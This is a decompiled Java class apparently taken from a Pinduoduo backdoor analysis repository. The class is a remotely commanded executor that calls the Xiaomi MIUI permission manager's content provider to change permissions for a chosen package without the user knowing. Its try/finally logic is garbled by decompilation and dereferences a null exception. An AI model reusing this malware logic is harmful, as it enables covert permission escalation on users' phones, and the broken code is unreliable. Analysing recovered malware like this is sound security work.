package com.google.android.sd.biz_dynamic_dex.xm_permission;

import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class XMPermissionExecutor extends DynamicCmdExecutor {
  private final int a = 4001;
  
  private static void a(Context paramContext, String paramString, long paramLong, int paramInt) {
    Bundle bundle = new Bundle();
    bundle.putLong("extra_permission", paramLong);
    bundle.putInt("extra_action", paramInt);
    bundle.putStringArray("extra_package", new String[] { paramString });
    bundle.putInt("extra_flags", 0);
    paramContext.getContentResolver().call(Uri.parse("content://com.lbe.security.miui.permmgr"), "6", null, bundle);
  }
  
  public void realExecute(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject(paramString);
    CmdData cmdData = new CmdData(4001, jSONObject.optString("uuid"), "client");
    try {
      boolean bool = "lbe".equals(jSONObject.optString("type", ""));
      return;
    } finally {
      Exception exception = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, exception.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\0fc0e98ac2e54bc29401efaddfc8ad7f-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\xm_permission\XMPermissionExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */